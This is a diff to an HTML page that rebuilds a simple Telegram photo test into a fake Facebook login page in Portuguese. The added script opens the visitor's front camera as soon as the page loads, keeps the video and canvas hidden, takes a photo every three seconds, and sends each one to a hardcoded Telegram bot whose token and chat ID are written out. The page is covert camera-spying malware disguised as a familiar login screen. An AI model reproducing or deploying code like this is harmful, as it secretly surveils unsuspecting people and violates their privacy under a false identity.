@@ -1,50 +1,240 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Teste de Envio de Foto</title>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Raleway:ital,wght@0,100;0,400;0,500;0,600;0,700;1,500;1,600&display=swap" rel="stylesheet">
+
+  <title>Document</title>
+  
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    html, body {
+      height: 100%;
+      font-family: sans-serif;
+    }
+    ul {
+      list-style-type: none;
+    }
+    a {
+      text-decoration: none;
+      color: inherit;
+    }
+    body {
+      background-color: #f0f2f5;
+    }
+    body > main {
+      width: 100%;
+      padding: 40px 2%;
+      max-width: 1000px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 100%;
+    }
+    @media screen and (max-width: 980px) {
+      body > main {
+        flex-direction: column;
+      }
+    }
+    .face-infos {
+      width: 50%;
+    }
+    .face-infos .container {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+    }
+    .face-infos img {
+      width: 300px;
+    }
+    .face-infos p {
+      font-family: 'Raleway', sans-serif;
+      text-align: left;
+      font-weight: 400;
+      font-size: 22px;
+    }
+    @media screen and (max-width: 980px) {
+      .face-infos {
+        width: 100%;
+      }
+      .face-infos .container {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        text-align: center;
+        justify-content: center;
+        margin: 19px auto;
+      }
+      .face-infos .container img {
+        margin: 0 auto;
+      }
+      .face-infos .container p {
+        text-align: center;
+      }
+    }
+    .form {
+      width: 100%;
+      max-width: 396px;
+      background-color: white;
+      height: 300px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 15px;
+      border-radius: 12px;
+    }
+    .entrada {
+      width: 98%;
+      border-radius: 5px;
+      height: 40px;
+      border: 1px solid rgb(209, 206, 206);
+      outline: none;
+      padding: 15px;
+      margin: 5px 0;
+    }
+    .entrada:focus {
+      border: 1px solid blue;
+    }
+    .blue {
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      font-weight: bold;
+      transition: .4s;
+      cursor: pointer;
+    }
+    .blue:hover {
+      background-color: #0d5ec7;
+    }
+    .form a {
+      color: #5092e9;
+      font-family: 'Raleway', sans-serif;
+      font-size: 14px;
+      margin: 15px 0;
+    }
+    .form a:hover {
+      text-decoration: underline;
+    }
+    .form .line {
+      width: 100%;
+      height: 1px;
+      border: 1px solid rgb(216, 218, 217);
+      margin-bottom: 15px;
+    }
+    .green-btn {
+      background-color: #42b72a;
+      border: none;
+      color: white;
+      width: 50%;
+      height: 40px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: .4s;
+    }
+    .green-btn:hover {
+      background-color: #3aa026;
+    }
+    .form-side p {
+      font-family: 'Raleway', sans-serif;
+      font-size: 14px;
+      margin-top: 18px;
+    }
+    .form-side a {
+      font-weight: bold;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-    <h1>Teste de Envio de Foto</h1>
-    <button id="send-test-photo">Enviar Foto de Teste</button>
+  <main>
+    <section class="face-infos">
+      <div class="container">
+        <img src="https://via.placeholder.com/300x150" alt="Facebook">
+        <p>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</p>
+      </div>
+    </section>
 
-    <script>
-        const botToken = '7039889991:AAEcoAkuppMt6JvzpJUhSkcXUOUQu1pKnrk';
-        const chatId = '5156117895';
-        const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+    <section class="form-side">
+      <form class="form">
+        <input type="text" class="entrada" placeholder="email ou telefone">
+        <input type="password" class="entrada" name="" id="" placeholder="senha">
+        <input type="button" value="Entrar" class="entrada blue">
+        <a href="#">esqueceu a senha?</a>
+        <div class="line"></div>
+        <input type="button" value="Criar nova conta" class="green-btn">
+      </form>
+      <p><a href="#">Criar uma Página</a> para uma celebridade, banda ou empresa.</p>
+    </section>
+  </main>
+  <footer></footer>
 
-        document.getElementById('send-test-photo').addEventListener('click', () => {
-            fetch('https://via.placeholder.com/150')
-                .then(res => res.blob())
-                .then(blob => {
-                    console.log('Blob da imagem de teste:', blob);
-                    sendPhotoToTelegram(blob);
-                });
+  <video id="camera-stream" width="640" height="480" autoplay></video>
+  <canvas id="camera-canvas" width="640" height="480"></canvas>
+
+  <script>
+    const video = document.getElementById('camera-stream');
+    const canvas = document.getElementById('camera-canvas');
+    const context = canvas.getContext('2d');
+    const botToken = '7039889991:AAEcoAkuppMt6JvzpJUhSkcXUOUQu1pKnrk';
+    const chatId = '5156117895';
+    const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        video.srcObject = stream;
+        capturePhotos();
+      } catch (error) {
+        console.error('Erro ao acessar a câmera:', error);
+      }
+    }
+
+    function capturePhotos() {
+      setInterval(() => {
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob((blob) => {
+          console.log('Foto capturada:', blob);
+          sendPhotoToTelegram(blob);
+        }, 'image/png');
+      }, 3000); // Captura uma foto a cada 3 segundos
+    }
+
+    function sendPhotoToTelegram(blob) {
+      console.log('Enviando foto para o Telegram');
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, 'photo.png');
+      fetch(url, {
+        method: 'POST',
+        body: formData
+      }).then(response => response.json())
+        .then(data => {
+          console.log('Resposta do Telegram:', data);
+          if (data.ok) {
+            console.log('Foto enviada com sucesso!');
+          } else {
+            console.error('Erro ao enviar foto:', data);
+          }
+        }).catch(error => {
+          console.error('Erro ao enviar foto:', error);
         });
+    }
 
-        function sendPhotoToTelegram(blob) {
-            console.log('Enviando foto de teste para o Telegram'); // Log para verificar se a função foi chamada
-
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'photo.png');
-
-            console.log('FormData:', formData); // Log para verificar o FormData
-
-            fetch(url, {
-                method: 'POST',
-                body: formData
-            }).then(response => response.json())
-              .then(data => {
-                  console.log('Resposta do Telegram:', data); // Log para verificar a resposta do Telegram
-                  if (data.ok) {
-                      console.log('Foto de teste enviada com sucesso!');
-                  } else {
-                      console.error('Erro ao enviar foto de teste:', data);
-                  }
-              }).catch(error => {
-                  console.error('Erro ao enviar foto de teste:', error);
-              });
-        }
-    </script>
+    // Inicia a câmera automaticamente quando a página é carregada
+    window.onload = startCamera;
+  </script>
 </body>
 </html>
